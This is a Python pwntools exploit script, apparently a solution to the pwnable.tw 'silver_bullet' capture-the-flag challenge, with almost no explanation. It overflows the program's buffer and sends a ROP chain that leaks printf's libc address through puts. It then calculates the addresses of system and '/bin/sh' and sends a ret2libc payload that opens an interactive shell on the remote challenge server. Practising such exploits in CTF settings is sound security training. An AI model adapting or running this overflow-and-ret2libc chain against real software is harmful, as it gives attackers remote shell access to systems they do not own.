# NOTE: This solution is overcomplicated!!!
from pwn import *

DEBUG = False

if DEBUG:
    gs = """
    b *0x8048A19
    set breakpoint pending on
    b system
    """ 
    # io = gdb.debug("./silver_bullet", gdbscript=gs)
    io = process("./silver_bullet")
else:
    io = remote("chall.pwnable.tw", 10103)

io.sendafter(b'choice :', b'1\n')
io.sendafter(b'bullet :', b'A'*47 + b'\n')

io.sendafter(b'choice :', b'2\n')
io.sendafter(b'bullet :', b'B\n')

puts_addr = 0x80484A8 
got_printf_entry = 0x804AFD4
read_input = 0x80485EB 
writable_memory = 0x804B820

# ROP gadgets - found using ropper
pop_ebp_ret = 0x08048a7b
pop_edi_pop_ebp_ret = 0x08048a7a
leave_ret = 0x08048641

# This payload must not contain null bytes!
payload = b'\xff'*7 + p32(puts_addr) + p32(pop_ebp_ret) + p32(got_printf_entry) + p32(read_input) + \
        p32(pop_edi_pop_ebp_ret) + p32(writable_memory) + p32(writable_memory) + p32(leave_ret) + b'\n'
io.sendafter(b'choice :', b'2\n')
io.sendafter(b'bullet :', payload)

io.sendafter(b'choice :', b'3\n')
io.recvuntil(b'win !!\n')

printf_leaked_addr = u32(io.recv(4))
print("printf_leaked_addr:", hex(printf_leaked_addr))

if DEBUG:
    libc_base_addr = printf_leaked_addr - 0x54340
    system_addr = libc_base_addr + 0x045830
    binsh_addr  = libc_base_addr + 0x192352
else:
    libc_base_addr = printf_leaked_addr - 0x49020
    system_addr = libc_base_addr + 0x03a940
    binsh_addr  = libc_base_addr + 0x158e8b

print("libc_base_addr:", hex(libc_base_addr))
print("system_addr:", hex(system_addr))
print("binsh_addr:", hex(binsh_addr))

io.sendline(b'AAAA' + p32(system_addr) + b'AAAA' + p32(binsh_addr))

io.interactive()
